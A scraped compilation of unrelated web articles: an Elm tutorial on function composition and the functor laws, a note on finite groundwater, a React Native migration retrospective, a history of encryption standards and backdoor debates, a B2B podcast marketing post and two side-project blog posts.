<p>Composition is "gluing" functions together into one function. This is such a common thing to do that many languages have dedicated operators for this. Lets look at an example to see it in action to see why this might be useful. I'll be doing the examples in Elm as composition is a bit awkward in javascript and not that common.</p>
<p>Lets say you have a user record that has the fields name and age:</p>
<div data-language="elm"><pre><code><span>type</span> <span>alias</span> <span>User</span> <span>=</span> 
    <span>{</span> <span>name</span> <span>:</span> <span>String</span>
    <span>,</span> <span>age</span><span>:</span> <span>Int</span>
    <span>}</span></code></pre></div>
<p>To get the age of a User record we can in Elm use an accessor function which is available for every field defined in a record.<sup><sup id="fnref-1"><a href="#fn-1">1</a></sup></sup> For the <code>age</code> field this function is called <code>.age</code> and has the type signature <code>User -&gt; Int</code>. It takes a <code>User</code> type as an argument and returns a <code>Int</code>. In this case it is the content of the age field.</p>
<p>Go get the age from a user you would to: </p>
<div data-language="elm"><pre><code>
<span>user</span> <span>=</span> <span>{</span> <span>name</span> <span>=</span> <span>"John"</span><span>,</span> <span>age</span> <span>=</span> <span>20</span> <span>}</span>


<span>.</span><span>age</span> <span>user</span>
</code></pre></div>
<p>At some point in your program you might have a <code>User</code> and need to display the age on a webpage, print it in a log or anything else that needs the age to be a string. To convert a <code>Int</code> into a <code>String</code> we can use the built-in function <code>fromInt</code> in the String module. </p>
<p>So where you have a user and need the age as a string you can use the compose operator in Elm to create a new function that gives you the user age as a string. I will write the type signatures for the functions as well so we can see how they fit together: </p>
<div data-language="elm"><pre><code><span>.</span><span>age</span> <span>:</span> <span>User</span> <span>-&gt;</span> <span>Int</span>

<span>fromInt</span><span>:</span> <span>Int</span> <span>-&gt;</span> <span>String</span>

<span>ageAsString</span> <span>:</span> <span>User</span> <span>-&gt;</span> <span>String</span>
<span>ageAsString</span> <span>=</span> <span>.</span><span>age</span> <span>&gt;&gt;</span> <span>fromInt</span></code></pre></div>
<p>When the output of a function matches the input of another we can compose them together and make a new function that has the input of the first and output of the second. Note that <code>&gt;&gt;</code> is the rightwards compose operator.<sup><sup id="fnref-2"><a href="#fn-2">2</a></sup></sup></p>
<h4>The second law</h4>
<p>Now that you hopefully know a bit about function composition lets look at the second law of functors. The rule says that composing functions into a single function and then mapping that function over the functor should produce the same result as mapping the individual functions over the functor in sequence. Lets look as some code to make sense of it:</p>
<div data-language="elm"><pre><code><span>users</span> <span>:</span> <span>List</span> <span>User</span>
<span>users</span> <span>=</span> 
    <span>[</span> <span>{</span> <span>name</span> <span>=</span> <span>"John"</span><span>,</span> <span>age</span> <span>=</span> <span>20</span> <span>}</span>
    <span>,</span> <span>{</span> <span>name</span> <span>=</span> <span>"Mary"</span><span>,</span> <span>age</span> <span>=</span> <span>22</span> <span>}</span>
    <span>,</span> <span>{</span> <span>name</span> <span>=</span> <span>"Kevin"</span><span>,</span> <span>age</span> <span>=</span> <span>30</span> <span>}</span>
    <span>]</span>

<span>agesThroughMaps</span> <span>:</span> <span>List</span> <span>String</span>
<span>agesThroughMaps</span> <span>=</span> 
    <span>users</span>
        <span>|&gt;</span> <span>List.map</span> <span>.</span><span>age</span>
        <span>|&gt;</span> <span>List.map</span> <span>String.fromInt</span>

<span>agesThroughComposeAndMap</span> <span>:</span> <span>List</span> <span>String</span>
<span>agesThroughComposeAndMap</span> <span>=</span> 
	<span>List.map</span> <span>(</span><span>.</span><span>age</span> <span>&gt;&gt;</span> <span>String.fromInt</span><span>)</span> <span>users</span></code></pre></div>
<p>In the example above we have a list of users and two constants<sup id="fnref-3"><a href="#fn-3">3</a></sup> that both are a list of the users’ ages as strings. </p>
<p>The first constant, <code>agesThroughMaps</code>, is defined using two map operations. The first run passes the <code>.age</code> accessor function to <code>map</code> and gives us a list of ages (of type <code>Int</code>). In the second map operation the <code>String.fromInt</code> is used to create a list of the users’ ages as <code>String</code>. </p>
<p>For the last constant, <code>agesTthroughMaps</code>, the list of the users age is created with one map operation where the function passed in to <code>map</code> is composed of the <code>.age</code> and <code>fromInt</code> functions with the compose operator (<code>&gt;&gt;</code>). </p>
<p>And this is the result of the second law: the values in the two constants should be equal. A list of strings: <code>["20", "22", "30"]</code></p>
<p>See full example in Ellie: <a href="https://ellie-app.com/bKhq8M4vyjYa1">https://ellie-app.com/bKhq8M4vyjYa1</a></p>
<h2>The consequences of the laws</h2>
<p>The laws might seem a bit random and not very helpful at first glance, but it can actually help us a lot. To be a functor the structure/container/context has to follow these laws. It can not do anything weird with the value/values in it or the function that is passed inn. The only thing it can do is apply the function to the value in the context. The functor might have some extra logic around when to apply the function. A list might be empty so there would be nothing to apply the function to and similarly with <code>Maybe</code>. Take a look at <a href="https://functional.christmas/2019/20">last years article</a> to see a more complex example.</p>
<p>With these rules for what constitutes a functor in place the behavior of functors become predictable. So if we see it in code or talk about it with fellow coders we know exactly how it should behave! 😄</p>

                        The Finite Nature of Water

                    <p>
                        Despite the apparent abundance of water, fresh water is primarily a non-renewable resource. Fresh water can originate from surface sources, like lakes, rivers, and ice, but more than half of americans get their fresh water from <a href="https://en.wikipedia.org/wiki/Resource_depletion#Groundwater">ground water</a> [<a href="https://www.usgs.gov/special-topic/water-science-school/science/groundwater-decline-and-depletion">1</a>]. At most 5.6% of our ground water can be replenished within 50 years after extraction. Although the total ground water in the Earth could cover the entire surface of the Earth to a depth of 18 meters, in many areas people are already drawing on water that is thousands of years oldâ€”or in some areas of Egypt, millions of years old [<a href="https://www.cbc.ca/news/technology/groundwater-study-1.3318137">2</a>,<a href="https://doi.org/10.1038/ngeo2590">3</a>].

                    <p>
                        "Reserves" are collections resources that we have identified within the Earth that we can extract at some pointâ€”but haven't yet. Estimates relating to reserves fluctuate as economic forces, technological chanages, and new resource discoveries alter what we know about resource availability and extraction feasibility. Nevertheless, they are most certainly <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust">finite</a>.

                    <p>
                        Although we may discover new reserves of a resource over time, the economic and practical feasibility of extracting the resources will eventually be insurmountable, andâ€”although there will still be an abundance of the element in the Earth's crustâ€”the resource becomes "exhausted" in all practical senses.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section><p>To make matters worse: the company behind the app were in the middle of a perfect storm. The business was being changed by regulation. The core business idea were changing. This meant large changes coming to the digital side, including the app.</p>
<p>Naturally, we had quite mixed feelings about our ability to meet delivery expectations from the business side, given the bad state of the app codebase. We were at a crossroads, and felt we had to pick one of the following:</p>
<ol>
<li>Negotiate a feature timeout while we frantically renovate the core code, or</li>
<li>Start a long-term migration plan towards a hybrid app, or</li>
<li>Write new features in React Native and eventually move all the JS code over to a new app shell</li>
</ol>
<p>We decided to try out React Native. Roughly three years later, the app is now 100% JavaScript. The big business transformation has come a long way, and I’ve experienced that React Native as a technology has played a key role in that success.</p>
<p>This article contains some reflections on <em>why</em> switching from pure native technologies to React Native worked so well for us.</p>
<h2>Starting Out Small Felt Really Safe</h2>
<p>We gave React Natives two tests. First, we wrote a small feature with a few developers. Futhermore, we did a larger, several-month feature where the entire team participated. A critical part of the tests was making sure that React Native would work as the small cogwheel it would necessarily start out as, inside of the large legacy app monster.</p>
<p>The people involved in each phase would evaluate the React Native developer experience, carefully considering if moving forward with React Native would be the right choice for us. After all, continuing with RN would mean a long migration process. Lots of our features would exist in the old, smelly native code for a long time, we would have to manually ensure backwards compatibility, handle (deep) navigation from old to new code (and vice verca), and lots of other things.</p>
<p>Even with these challenges in mind, the team were crystal clear post-testing. React Native made work easier, faster and more fun! In case we’d conclude differently, the investment made was so low that we could safely discard the effort as a proof-of-concept, where the learnings were enough to justify the time spent.</p>
<p>Trying out new technology this way just seems like a very smart way to do it. It was also key that it was the voice of the developers spending all day with the technology that weighed the most.</p>
<h2>We Actually Did Develop New Features Much Faster</h2>
<p>They say React Native save you half the work. Since your code will run on both iOS and Android, it eliminates the need to develop separate code &nbsp;for each platform. Write code once – not twice. Neat!</p>
<p>In our experience, this was mostly true. We did end up doing minor platform customizations here and there. Shadows don’t work as well on Android as iOS. Sometimes you’d want different UI behaviours to adhere to platform guidelines. And as with web development, you’ll encounter visual bugs for each platform that need special attention.</p>
<p><strong>I’d say we saved about 45% of the work involved.</strong> It’s not half - but it still makes a tremendous difference on productivity!</p>
<p>It’s also hard to not talk about the productivity boost obtained by Hot Reload (now Fast Refresh). Seeing the effect of my last code edit presented visually on screen immediately (with state preserved) is simply marvelous. Scale up the time saved for each little change with the amount of the developers involved and the amount of time spent… it’s just huge!</p>
<p><img src="https://microsoft.github.io/react-native-windows/blog/assets/fastrefresh.gif" alt="animation showing how react-native's &quot;Fast Refresh&quot; works" title="React Native's &quot;Fast Refresh&quot;"></p>
<h2>All Developers Code For Both Platforms</h2>
<p>I’ve met hundreds of fine developers, if not thousands. But those skilled and efficient in both native iOS and native Android development - I can count them on one hand. And they’re not exactly looking for work.</p>
<p>With React Native, we experienced that the entire team could do work for both platforms. It’s hard to overstate the importance of this fact. Instead of having dedicated iOS and Android teams, we’d have a feature being made by the same person (or small group) on both platforms, reducing the overhead involved in coordination and organization between devs and designers, business folks, product owners, etc. Also, fewer people needed to learn the ins and outs of that particular feature in a quite complex domain.</p>
<p>This provides great flexibility and robustness for a development team, and was much needed in our setting.</p>
<h2>Recruitment and Onboarding</h2>
<p>Not too many people are familiar with native mobile technologies. In comparison, capable JavaScript/React-developers come a dime a dozen. We found that finding talent was easier, and the newcomers found themselves productive way quicker than we’d expect. In a period with frantic scaling and expansion, this was critical.&nbsp;</p>
<p>I can imagine recruiting top-notch mobile development specialists is easier if you’re a huge company with infinite resources. In that case, you could staff the necessary amount of specialist teams for iOS and Android and just steamroll whatever you’re making.&nbsp;</p>
<p>In the Norwegian market, with finite resources, easing your requirements from <em>«five years of Swift»</em> to <em>«five years of JavaScript experience»</em> makes all the difference. The programming language in itself is one thing, but there’s also the ecosystem, development enviroment, IDE, etc. Apple make a lot of really sweet products, but XCode surely isn’t one of them.</p>
<h2>Team Organization</h2>
<p>Our old codebase was.. entangled. I imagine it would be challenging to attempt doing distributed development on the same codebase across several teams. At least when aiming for near-continuous delivery. Doing a Spotify-like product team organization with an app dev in each team seemed utopian at the time.</p>
<p>Over the course of a few years, we went from a dedicated mobile team of five to a product team organization with near 20 mobile developer spread across all teams. This would be much harder without the flexibility and familiarity of <em>«it’s just JavaScript»</em> or <em>«it´s just React»</em>. Not having to invest as much time and energy in specialist competencies for iOS or Android, app devs have more cognitive surplus to work on other things as well - web, cloud stuff, backend, UX-collaboration, etc.</p>
<h2>Deploy To Production At Will</h2>
<p>Mobile apps have always had a longer way to production. The <em>«quality control»</em> mechanism with manual app reviews adds several days to the pipeline. The Apple App Store was alone responsible for up to a 14-day delay at it’s worst, although the wait times have been vastly reduced since then. Now they’re averaging at about a day.</p>
<p>A good dev team in 2020 will deploy to production many times each day. Looking at some of the biggest Norwegian apps today, it is not uncommon to see two-three-four week old builds as the most recent one.&nbsp;</p>
<p>The negative effects of not releasing your code often, and not even having the possibility to release at will, are well documented. React Native with it’s <em>over the air</em>-update called <em>CodePush</em> allows for continous delivery, even for mobile apps!&nbsp;</p>
<p>CodePush allows your app code to download the latest version of the compressed JavaScript bundle from a third-party server. When a user opens the app, the new bundle is downloaded and immediately installed. Voilà – immediate deploy to production!</p>
<p>Our app’s release cycle went from semi-monthly to several releases per day. Paired with great monitoring, this reduces the need for testing. Non-critical bugs can be tolerated to a larger degree if they don’t reach your entire audience before they’re automatically detected and shortly fixed.&nbsp;</p>
<p>Product development is also way faster. The team can iterate on small changes on real customers in production as a part of the development process, instead of lengthy sketching and laboratory user testing. This made the entire organization more customer-focused and impatient for real customer feedback.</p>
<h2>A Note On The Rewrite</h2>
<p>The whole codebase transformation to React Native took about two years. We only wrote already-planned new features in React Native, allowing us to be productive and produce new features during the process. The business transformation underway meant that most of the features would have required changes anyway, and it could actually be faster to implement them from scratch in React Native than to modify the legacy code.&nbsp;</p>
<p>This meant that we didn’t need a feature-freeze period with the team stuck on unproductive rewrite work. However, when most of the old app was rewritten, we needed a month-long cleanup to move all the separate features in the old app over to a new, fresh React Native repo.&nbsp;</p>
<p>From around March 2017 until June 2019 the app was in a state where some features existed in the old codebase and others in the new codebase. That wasn’t a pleasant situation, but not more unpleasant than working in the old legacy codebase before.</p>
<h2>Status As We’re Looming On 2021</h2>
<p>A total of <strong>10,000 commits</strong> have been made by <strong>33 contributors</strong> across <strong>5 teams.</strong>. Nearly 50 pull-requests from 14 authors was merged the past week. Our ability to deliver on business requirements have been strengthened. Looking back on our big choice of 2017, it’s truly awe-inspiring to see how big an effect a simple technology choice can have on helping teams reach lofty goals.</p>
<p>No technology is a silver bullet. React Native surely isn’t either. But it does have some truly wonderful effects on an impatient, agile, modern development organization that Swift, Kotlin or C# currently can’t offer, in my opinion.</p></section></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Cryptography is the science of secret writing with the goal of hiding the meaning of a message. When a message is encrypted with a secure algorithm, i.e. an encryption cipher, no one should be able to read it without the decryption key. However, the promise of security falls apart if the encryption algorithm is weak, or if someone has created a backdoor. In this article we’ll examine the modern history of encryption. We’ll learn that while the mathematical underpinnings of modern encryption is stronger than ever, government agencies have a history of thwarting efforts to reach the goal of truly secure communication. </p>
</section><article><section><p>The world’s first encryption ciphers often used algorithms that were themselves secret. The rather intuitive belief that security increases if the encryption details are hidden is a misconception, and is often referred to as <em>security by obscurity</em>. The algorithms that dominate the modern era rely on full openness, in accordance with <em>Kerckhoffs's principle</em>:</p>
<blockquote>
<p>A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.</p>
</blockquote>
<p>This transparency allows the rest of the world to attempt to break the cipher. Every failed attempt at breaking a cipher reinforces the belief that it is secure. While there is a chance that someone breaks a cipher and does not report it, there is a far greater chance that a homemade algorithm will be broken easily.</p>
<h2>A big moment in cryptographic history</h2>
<p>Up until 1972 there was no standard cipher for encrypting secret messages. The US <em>National Bureau of Standards (NBS)</em>, which later became the <em>National Institute for Standards and Technology (NIST)</em>, started an initiative for finding a single secure algorithm. This was rather revolutionary. The American government had traditionally kept their knowledge of cryptography to themselves - they considered it to be crucial to national security. As a result of the NIST initiative, several ciphers were proposed as candidates for the first encryption standard.</p>
<p>The most promising candidate was contributed by a team of cryptographers working at IBM. They developed a refined version of an earlier encryption cipher called Lucifer, which was first developed by Horst Feistel in the late 1960s. Their candidate was a block cipher with a key size of 128 bits. A block cipher is an algorithm that encrypts several bits at a time, i.e. a block of bits, as opposed to stream ciphers that encrypts bit by bit. A sufficiently large key size is necessary for a cipher to withstand brute force attacks, since these attacks generate all possible decryption keys. In context of a brute force attack, one would say that the larger the key size the more robust the cipher.</p>
<h2>Speculation of NSA backdoors</h2>
<p>When the NIST examined the security of the cipher candidates, they reached out to the <em>National Security Agency (NSA)</em> for assistance. At this point in time the NSA did not even admit their own existence. The involvement of the NSA lead to speculation and rumors, since the cipher went through a couple of peculiar alterations during the cooperation between NSA and IBM. </p>
<p>The most worrying change was that the key size was reduced from 128 bits to 56 bits. This made the cipher considerably less resistant to brute force attacks. Concerns were raised that this change was motivated by the NSA, in order to provide themselves with a backdoor. Maybe their computers were powerful enough to brute force a key size of 56 bits – but not quite powerful enough to brute force a key size of 128 bits? </p>
<p>The cipher was also altered to be resistant to attacks using differential cryptanalysis. That doesn’t sound too bad, but this particular attack was not known to the public until 1990 – almost 20 years later! If the NSA were familiar with an attack the world would need 20 more years to discover, it is not hard to believe that they might be able to brute force a 56 bit key. However, it should be noted that none of these claims have been proven. </p>
<p>In 1977, the NIST presented an altered version of the IBM cipher as the new standard, which they named the <em>Data Encryption Standard (DES)</em>. It became the first modern, public, freely available encryption algorithm. All details regarding DES were made public, which is good practice since it allows researchers to scrutinize the mathematical details. However, the motivation for the design criteria remained secret. The public never learned why the key size was reduced, and this was the main cause for suspicion regarding the involvement of the NSA.</p>
<h2>DES cracked through brute force attack</h2>
<p>DES was initially meant to be the standard cipher for encryption for 10 years; from 1977 to 1987. But no serious weakness was found, and DES went on to reign as the standard algorithm for more than a decade past its due; until 1999.
In the final years of DES, several attempts were made to design and build a machine to brute force it. Building such a machine would cost millions of dollars. It was speculated that only government agencies would have the necessary financial resources to build it, and by this time it was widely believed that the NSA could in fact crack DES.</p>
<p>As the price of hardware fell, the <em>Electronic Frontier Foundation (EFF)</em> built the machine
<a href="https://en.wikipedia.org/wiki/EFF_DES_cracker">Deep Crack</a>.
In 1998 Deep Crack was able to brute force DES in 56 hours. This event demonstrated that it was time to select a new standard cipher for encryption.</p>
<p>In 1997, the NIST initiated an open competition to find a new standard encryption cipher. The competition had five finalists:
<a href="https://www.cs.miami.edu/home/burt/learning/Csc688.012/rijndael/rijndael_doc_V2.pdf">Rijndael</a>,
<a href="http://cryptosoft.de/docs/Mars.pdf">Mars</a>,
<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.2.1151&amp;rep=rep1&amp;type=pdf">RC6</a>,
<a href="http://www.networkdls.com/Articles/serpent.pdf">Serpent</a> and
<a href="http://gazizova.net/pub/Library/ihtik_Library/dvd_(%D0%A0%D0%B0%D0%B4%D0%B8%D0%BE)%D0%AD%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D0%B0/rea_2/Schneider%20B.Twofish.A%20128-bit%20block%20cipher.1998.pdf">Twofish</a>.
This time the selection process was completely transparent. In 2001, after three competitive rounds and intense cryptanalysis by the world’s foremost experts, the decision was made. The cipher Rijndael, designed by the Belgian cryptographers Joan Daemen and Vincent Rijmen, was declared as the new standard. It was given the name <em>Advanced Encryption Standard (AES)</em>. This cipher has three possible key sizes: 128 bit, 192 bit and 256 bit. All these key sizes were sufficiently large to withstand brute force attacks.</p>
<p>AES is widely regarded as the most secure encryption cipher invented. It has been battle-tested for decades and is expected to remain the standard cipher for many years to come. So far there are neither any known critical weaknesses, nor suspicion of backdoors.</p>
<h2>Attempts at legalizing government backdoors</h2>
<p>Algorithms have matured to be practically unbreakable, but current legislative measures attempt to undermine the basic purpose of cryptography. There are recurrent proposals for allowing government backdoors. For instance, the recently proposed <a href="https://www.judiciary.senate.gov/press/rep/releases/graham-cotton-blackburn-introduce-balanced-solution-to-bolster-national-security-end-use-of-warrant-proof-encryption-that-shields-criminal-activity"><em>Lawful Access to Encrypted Data Act</em></a> aims to force technology companies to implement backdoors. The right to privacy ends when the government institutions deem it useful to their own agenda. If such a law were to pass, the consequences would be immediate and severe. It would grant immense power to the government, and if a key is leaked or stolen, all encrypted communications are out in the open. Lawmakers argue that having a backdoor would help fight crime and terrorism, but this view assumes that criminals play by the rules and communicate through services using government issued encryption. </p>
<p>In the modern era the goal of private digital communication is, from a technological standpoint, a solved problem. It remains to see if future citizens will be able to enjoy digital privacy in their lives. It’s a question of balancing power between the government and the people – and problems of that nature are not solved as elegantly as cryptographic puzzles.</p>
<p><em>If you want to go further down the rabbit hole, I highly recommend listening to the following episode of the Darknet Diaries podcast: <a href="https://darknetdiaries.com/episode/12/">Episode 12 - Crypto Wars</a>.</em></p></section></article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Is it possible to use podcasts for b2b marketing?</em></p><p>Is a question I have heard approximately 23 times since we started Fame.</p><p>The growth of our agency has proven the answer to this question to be: a resounding yes.</p><p>The next question they ask is... how?</p><p>This is the post I then link to these people...</p><p>Below I share what we see to be the seven core benefits of starting and growing a B2B podcast for your business.</p><p>Before we jump in, if you're not 100% sure what we mean by the team "podcast marketing" then we suggest you quickly check out this post on the <a href="https://www.bcast.fm/blog/what-is-podcast-marketing" target="_blank">what, why and how of podcast marketing</a>.</p><h2>1. Form Profitable Partnerships</h2><p>Most of what we do as B2B marketers follows this process:</p><ol role="list"><li>Work out who we want to sell to</li><li>Get the attention of these people</li><li>Try to sell to them</li></ol><p>If we improve at each of these steps over time, then we should ideally be able to close sales.</p><p>Step 2 can often be the most expensive step, as driving targeted traffic from Linkedin gets more expensive by the day.</p><p>A little known method for executing Step 2 really well, is to simply make friends with people or business that already have the trust of your perfect audience, and then get them to promote you... they do this for one fo the following reasons:</p><ul role="list"><li>Out of the goodness of their heart</li><li>Because you will promote them back</li><li>Because you pay them upfront</li><li>Because you offer them a percentage of any sales made</li></ul><p>Now, if you can somehow get these people to like you before pitching them on any of the above reasons for promoting you, you will increase the likelihood of the first reason, and will get a better deal on any of the others.</p><p>And the best way to get them to like you is to create content together, and expose them to your audience FIRST... through your podcast.</p><p>As an example, multiple partnership agreements have been formed between the host and the guests of the Sales Ops Demystified podcast:</p><figure id="w-node-e6a5c2299804-86dd1663"><a href="https://podcasts.bcast.fm/sales-ops-demystified" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdeeb3f750a002bb1415f2_Sales_Ops_Demystified.jpg" loading="lazy" alt=""></p></a><figcaption><em>If guests work in the same niche as the host, partnerships can be formed.</em></figcaption></figure><h2>2. Get Feedback From Experts</h2><p>Would your product or service be better if you were able to receive feedback from one proven expert in your niche per month for twelve months straight?</p><p>I think the resounding answer would be: <strong>yes</strong>.</p><p>So the question then becomes... how can we incentivise these experts to add value to your business?</p><p>The answer to this question is resoundingly simple: you add value to their business first.</p><p>You see, when you invest in building a niche audience, the audience itself is an asset. The audience like and trust you, and will therefore reward you with their attention.</p><p>When you bring a guest onto your show, and expose them to your audience, you are adding value to their business.</p><p>Numbers 1, 2 and 7 on this list all centre around building strategic relationships with people in your niche.</p><p>A podcast is hands down the most effective and time efficient way of doing this.</p><p>One example of this is when Sujan Patel joined the Confessions Of A B2B Marketer podcast to be interviewed about his expertise, post interview he said he would love to have another call to give feedback on our growth...</p><p>Two weeks later we jumped on another call, recorded it for another podcast episode:</p><figure id="w-node-f5ac55325769-86dd1663"><a href="https://saasmarketer.io/ep-015-sujan-patel-shares-4-saas-growth-strategies-for-bcast/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdea1b882431471c817b97_Ep_015_-_Sujan_Patel_Shares_4_SaaS_Growth_Strategies_For_bCast.jpg" loading="lazy" alt=""></p></a><figcaption><em>Sujan giving us free advice on how to grow bCast</em></figcaption></figure><p>I think Sujan typically would charge $000's per hour for this kind of advice...</p><h2>3. Generate Linkedin Engagement From Content</h2><p>The way you get social networks to send you traffic is to first give them what they want.</p><p>This is actually a deeper life lesson but I will elaborate on that in another blog post, post retirement.</p><p><em>What do social networks want?</em></p><p>Ultimately, it's our attention that they're after.</p><p>They want every human eye glued to the phone or laptop, every second of every day. Because this is how they make money.</p><p>So if you want more traffic for your business, you need to first give Linkedin what they want: attention.</p><p>You give Linkedin attention by providing people information that either:</p><ul role="list"><li>Informs them</li><li>Inspires them</li><li>Educates them</li></ul><p>And a podcast is an awesome way to do this.</p><p>You simply pull out the big insight from an episode then post it to Linkedin in written, image or video form.</p><p>Over time, you will learn the type of content that your target audience enjoys... then you can do more of that.</p><p>Here is an example of this:</p><figure id="w-node-59d45d622ac0-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcde7e1be636192578214ac__99___Post___LinkedIn.jpg" loading="lazy" alt=""></p><figcaption><em>Linkedin rewarding Patrick for posting engaging content...</em></figcaption></figure><h2>4. Generate Linkedin Engagement From Shares</h2><p>There is an unwritten rule in the podcasting world.</p><p>If you guest on a show, you share the show.</p><p>It proves to be true 75% of the time.</p><p>So when you are selecting guests, you need to take this into account...</p><p><em>Who in your niche would be the best person to share your content? E.g. who has the biggest and most engaged audience of your target customers on Linkedin?</em></p><p>Here is an example of the guest of a podcast, sharing the episode and therefore inherently endorsing the host of the podcast with this share:</p><figure id="w-node-2d89a6a44789-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcdeb0ff20459075e12bddc_Shrawan_Patel__MD___LinkedIn.jpg" loading="lazy" alt=""></p><figcaption><em>Guests giving traffic and authority to the host...</em></figcaption></figure><p>Any trust that the connections of this guest have in the guest, is transferred to the host, generating social followers, traffic and ideally: leads and then sales.</p><h2>5. Rank For Long Tail Keywords</h2><p>The "hub and spoke" model is a tried and tested SEO strategy.</p><p>The basic premise is that you choose a main keyword and optimise a page on your website for this keyword. You then select sub-keywords of this main keyword and then write blog posts on the topic. These blog posts then all link back to your main keyword page.</p><p>Podcast episode blog posts make GREAT sub-keyword blog posts:</p><ul role="list"><li>They contain, original engaging content</li><li>The guest will drive traffic (see above)</li><li>The guest will provide a link back (see below)</li></ul><p>To do this, you either retrofit a keyword to the content, or decide upon which keyword you want to tackle before recording.</p><p>If your release one episode per week for a year, you will generate 52 high engaging sub-keyword blog posts related to your niche... which should have already started to generate some solid inbound traffic.</p><p>Here is an example of <a href="https://saasmarketer.io/saas-marketing-playbook/" target="_blank">an episode</a> of the Confessions Of A B2B Marketer podcast rising to the top of the rankings for a long tail keyword related to their niche:</p><figure id="w-node-29c5eb31232d-86dd1663"><p><img src="https://uploads-ssl.webflow.com/5f60836640ce25f514e1c4da/5fcde5f8a80b9678140893de_Overview_%E2%80%94_SaaS_Marketer.jpg" loading="lazy" alt=""></p><figcaption><em>An episode keyword rising in the rankings...</em></figcaption></figure><h2>6. Get Backlinks</h2><p>Every marketing team is looking for real, genuine backlinks.</p><p>Real genuine backlinks lead to real, genuine organic hits on your site.</p><p><em>So how does podcast marketing deliver this?</em></p><p>If you do a great job of creating written, audio and even video content that makes your podcast guest look great, then they are going to want to show it off to their friends, family and future employers.</p><p>They are going to want to link.</p><p>We see approximately one in five podcasts guests link back to their hosts... how do you get them to do this?</p><p>A certain number of guests will do this naturally, for the rest: you just ask.

<h2>Making the most of my downtime working on side projects</h2>



<p>I may have mentioned in a <a href="https://www.philliphughes.co.uk/general/diy-and-gardening-since-when-have-i-become-so-middle-aged/" target="_blank" rel="noreferrer noopener">previous blog post</a>, I’ve been put on reduced hours. I’m down to a 3 day week. It’s not all bad. Apart from all the extra time to work on our house and be out in the gardens. I’ve been able to work on my side hustle and business ideas.</p>



<p>I’ve got quite a few “irons in the coals” as it were. It seems people are more open to discussing the ideas and giving feedback.</p>



<p>Once of my projects has been on the go for at least two years now. After spending month and months last year trying to find people to give me some input on the idea. Last week I finally&nbsp;got it in front of a couple of potential customers. Using&nbsp;<a href="http://zoom.us/" target="_blank" rel="noreferrer noopener">Zoom</a>&nbsp;to demo the product and they loved it.</p>



<p>After chatting in a Facebook group. A few weeks ago I&nbsp;came up with an idea for a fishing based mobile app.&nbsp;<a href="https://baitcamp.net/" target="_blank" rel="noreferrer noopener">I quickly got a website together</a>&nbsp;and asked few people to give it a once over. Then, got a small Google ads campaign going and found around 30 potential customers in just a few days.&nbsp;</p>



<p>I’ve started building out the app design and used <a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> to send out updates on the design to get further feedback from the people that are interested.</p>



<p><a href="https://outflash.xyz/" target="_blank" rel="noreferrer noopener">Outflash</a> is my main side hustle. It’s nearly 12 months since I came up with the idea. Looking back it’s been a bit of a whirlwind and I have learnt a lot.</p>



<p>The down time is giving me more time to focus on Outflash and plan things a bit better. I hoping to be more structured when working and promoting the email enhancement&nbsp;add-in. Let’s hope I can stick to it.</p>



<p>What sorts of projects have you been working on over the last 6 weeks?</p>



<p>Thanks</p>



<p>Phil</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>It’s been a while since I have blogged about <a href="https://www.philliphughes.co.uk/general/starting-a-side-hustle-the-frustrations-trials-and-tribulations-part-1/" target="_blank" rel="noreferrer noopener" aria-label="starting a side hustle (opens in a new tab)">starting a side hustle</a>. I’ve been terrible at writing new posts about my trials and tribulations. I promised that I would post regular updates (8 months isn’t regular). </p>



<p>So, without further ado. Here is what I have been up to, and what frustrations, trials and tribulations I have been going through with my side hustles.</p>



<p>My main focus has been on two software products (SaaS). One of them is called <a rel="noreferrer noopener" aria-label="Elementary Analytics (opens in a new tab)" href="https://www.philliphughes.co.uk/general/starting-a-side-hustle-the-frustrations-trials-and-tribulations-part-2/://elementaryanalytics.com" target="_blank">Elementary Analytics</a>, which I have been working on for well over 18 months now. </p>



<p>The second product is an idea I came up with shortly after my last post. After listening to a podcast about a Gmail plugin. I thought I could come up with something similar for Outlook.com. So in October 2019,  after 4 months of graft I manage to launch <a rel="noreferrer noopener" aria-label="Outflash (opens in a new tab)" href="https://outflash.xyz/" target="_blank">Outflash</a>.</p>



<h3>Becoming Good At Juggling</h3>



<p>Trying to launch two software products alongside each other is a bit of juggling act. I’m also trying to do things differently, or start trying things I haven’t done before. This mantra has come from the following two sayings: </p>



<p>“If you want different results from what you have had before. You need to do things differently”</p>



<p>“The definition of madness is doing the same thing over and over again and expecting different results”.</p>



<p>I’ve tried to keep these sayings in the front of my mind. Forcing myself to try different things. Hopefully to discover something that’s working.</p>



<p>What has that looked like recently? Well, I have taken a few online courses relating to software marketing. I have also registered for a few MeetUp groups and attended a marketing based meet up at the start of 2020.</p>



<p>My focus has changed slightly. I’m trying to do a 50/50 split of 50% product development and 50% marketing efforts. However, I’m still a complete newbie at marketing. Finding it a real challenge to “move the needle”.</p>



<p>Unlike the last few blogs about <a rel="noreferrer noopener" aria-label="working on my side hustles (opens in a new tab)" href="https://www.philliphughes.co.uk/general/what-i-learned-from-failed-side-hustles/" target="_blank">working on side hustles</a>. I’m going to start with a few positives.</p>



<h4>Positives</h4>



<p>1)  If I have had an idea that I think could become a business in the future. Instead of diving straight in and building something. I have been creating landing pages to validate the idea and to building an email list of potential users/customers first. This helped my decide to work on <a rel="noreferrer noopener" aria-label="Outflash  (opens in a new tab)" href="https://outflash.xyz/" target="_blank">Outflash</a> instead of another idea.</p>



